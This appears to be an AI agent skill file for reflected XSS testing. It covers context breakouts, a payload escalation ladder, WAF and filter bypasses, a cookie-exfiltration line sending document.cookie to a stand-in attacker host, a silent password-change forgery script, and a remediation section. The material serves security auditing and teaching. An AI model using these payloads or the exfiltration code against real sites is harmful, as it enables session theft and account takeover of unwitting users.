---
name: xss-reflected
description: Detect, exploit, and remediate Reflected Cross-Site Scripting in search queries, error pages, parameter echoes, and header reflections using context-aware breakout sequences, payload escalation ladders, WAF bypass techniques, and CSP evaluation for detection and proof-of-execution.
---

# Reflected Cross-Site Scripting (Reflected XSS)

Reflected XSS occurs when client-supplied input travels from the current HTTP request directly into the server's response without persistence or adequate encoding. This skill covers systematic reflection discovery, context classification, payload escalation, filter evasion, and impact demonstration through crafted links.

## When to use this skill

- Testing GET/POST parameters such as `q=`, `search=`, `keyword=`, `redirect_uri=`, `error_msg=`, `callback=`, or pagination parameters that echo back into responses.
- Server responses embed HTTP headers (`Referer`, `User-Agent`, `Host`, custom headers) inside error screens or debug diagnostics.
- Preparing crafted proof-of-concept links for security audit deliverables requiring one-click exploitation.
- Error handlers, 404 pages, or validation messages interpolate raw user input into HTML templates.
- WAF or input filters block obvious payloads and context-specific evasion is required to prove execution.

## Methodology

### 1. Locate reflections with a canary probe

Inject the canary `'"><()` into every candidate parameter and search the raw response source for each character:

```http
GET /search?q='"><() HTTP/1.1
Host: target.tld
```

The surviving character set dictates the breakout strategy: `<` surviving enables direct tag injection; `"` surviving enables double-quoted attribute breakout; `'` surviving enables single-quoted attribute breakout; backslash surviving inside JavaScript string contexts enables string termination attacks.

### 2. Classify the injection context

Map exactly where the reflection lands in the DOM before selecting payloads:

- **HTML body** (`<div>INPUT</div>`): inject tags directly with no breakout prefix required.
- **Double-quoted attribute** (`value="INPUT"`): break out with `" onfocus=alert(1) autofocus="` or escape the tag entirely via `"><svg onload=alert(1)>`.
- **Single-quoted attribute** (`value='INPUT'`): break out with `' onmouseover='alert(1)` and add `autofocus` for interaction-free triggering.
- **Unquoted attribute** (`value=INPUT`): a single space introduces new attributes directly: `onfocus=alert(1) autofocus`.
- **JavaScript string** (`var x = 'INPUT';`): terminate with `';alert(1)//`; when backslashes get escaped as `\'`, neutralize them with `\\';alert(1)//`.
- **URL context** (`href="INPUT"`): inject `javascript:alert(1)`; against scheme filters use tab-entity obfuscation `jav&#x09;ascript:alert(1)`.
- **CSS context** (`<style>INPUT</style>`): terminate the block with `</style><img src=x onerror=alert(1)>`.

### 3. Escalate through the payload ladder

Start with the simplest vector and escalate rung by rung as filters reject each attempt:

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart=alert(1)>
```

Blocking of `<script>` forces event-handler vectors; blocking of `svg` forces `<img onerror>`; aggressive tag allowlists fall to `<animate onbegin>` because SVG animation elements evade naive regexes; `<details open ontoggle>` fires without user interaction on benign tags; the CSS animation rung executes on elements no tag-based filter considers dangerous because no JavaScript-named attribute appears until runtime style resolution.

### 4. Apply filter bypass techniques

Deploy these evasion classes against regex-based filters and WAFs:

- **Case variation**: `<ScRiPt>alert(1)</ScRiPt>` defeats case-sensitive matching since HTML parsing is case-insensitive.
- **Unclosed tags**: `<img src=x onerror=alert(1)//` executes because browsers auto-close tags at document end.
- **Nested tag splitting**: `<scr<script>ipt>alert(1)</scr</script>ipt>` leaves a valid tag after the filter strips one `<script>` occurrence.
- **Encoding tricks**: HTML entities inside attribute values (`&#x6a;avascript:`), JS unicode escapes inside string contexts (`\u0061lert(1)`), hex escapes (`\x61lert`), and double URL encoding against decode-once pipelines.
- **CSP nonce reuse**: scrape per-response nonces through injected CSS exfiltration or dangling markup, then replay them in an injected script tag; nonces that leak via cached pages remain exploitable.
- **Tag-breaking payloads in URL parameters**: craft shareable links that execute on victim click:

```http
https://target.tld/search?q=%22+onfocus%3D%22alert(document.domain)%22+autofocus%3D%22
```

### 5. Demonstrate real-world impact

Move beyond `alert(1)` to prove business risk:

```javascript
// Session cookie exfiltration PoC
fetch('https://attacker.local/log?c=' + encodeURIComponent(document.cookie))
```

```javascript
// Client-side request forgery: silent password change from victim session
fetch('/api/user/password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'PwnedPassword123!'})
})
```

Impact severity scales with victim privilege: execution inside an administrator session constitutes full account takeover capability.

## Tooling

- Dalfox — fast parameter analysis and XSS scanning with built-in payload generation and headless verification.
- XSStrike — context-aware payload generation with WAF detection and fuzzing engine.
- Burp Suite Intruder + Gf (`gf xss`) — bulk reflection discovery across large parameter sets using curated patterns.
- Param Miner — Burp extension uncovering hidden parameters that may reflect untested input.
- PortSwigger XSS Cheat Sheet — canonical vector reference organized by context and filter behavior.
- BeEF — browser exploitation framework for hooking reflected victims and demonstrating post-exploitation impact.

## Remediation & Secure Architecture

1. **Enforce context-aware HTML entity encoding**: all dynamic input rendered into HTML body or attributes passes through a standard encoder (`htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` in PHP, OWASP Java Encoder in Java, `he` in Node) covering both double and single quotes.
2. **Rely on framework auto-escaping**: modern template engines encode by default; prohibit escape hatches such as `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, and Rails `html_safe` except through reviewed sanitization wrappers.
3. **Return strict Content-Type headers**: API endpoints return `application/json` rather than `text/html` so reflected JSON never parses as markup; set `X-Content-Type-Options: nosniff` globally.
4. **Deploy CSP without inline trust**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0mPerRequest'; object-src 'none'; base-uri 'none';
```

5. **Validate URL parameters against scheme allowlists**: restrict redirect and callback parameters to `http:`/`https:` absolute URLs on trusted origins, blocking `javascript:` URI injection at the validation layer.

**Deliverables**

- Findings table mapping each reflected parameter to its injection context (body/attribute/JS/URL/CSS), executing payload rung from the ladder, required user interaction level, and severity rating.
- PoC scripts containing working proof URLs per finding plus exfiltration logs demonstrating execution against real victim sessions rather than self-XSS only.
- Remediation matrix listing every vulnerable reflection point alongside its required control (encoder type per context / CSP directive / Content-Type hardening / URL validation) with retest verification status per item.

## Verification & Deliverables
A complete engagement run of this skill produces:
- Screenshot of executed payload (e.g. `alert(document.domain)`) with the triggering URL.
- Context matrix: every reflection point with its encoding/context and the breakout that worked.
- CSP and WAF analysis: policy observed, bypass chain used (if any).
- Impact escalation demonstrated where possible (cookie exfil simulation, keylogger, request forgery on behalf of victim).
- Remediation: output-encoding strategy per context, template auto-escaping enabled, CSP proposal — re-tested.
If any artifact is missing, the test is incomplete — return to the corresponding methodology step.
